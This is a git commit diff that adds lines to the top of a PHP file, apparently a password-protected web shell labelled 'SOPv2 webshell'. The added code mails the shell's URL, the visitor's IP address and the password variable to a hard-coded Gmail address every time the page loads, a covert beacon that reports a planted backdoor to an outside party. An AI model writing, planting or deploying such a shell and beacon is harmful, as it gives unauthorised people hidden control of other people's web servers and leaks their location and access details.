ca5bc1b6fe2a5a27aff313210b7ce14a9b415c4d
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-01-15 04:20:09 +0700

    Update 3fm.php

--- 3fm.php
+++ 3fm.php
@@ -1,4 +1,9 @@
 <?php
+$tujuanmail = 'muhrazky@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "cek $x_path  *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ] Pass: [ $pass ]";
+mail($tujuanmail, "SOPv2 webshell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?><?php
 session_start();
 $pass = "kem";
 if (!isset($_SESSION["auth"])) {
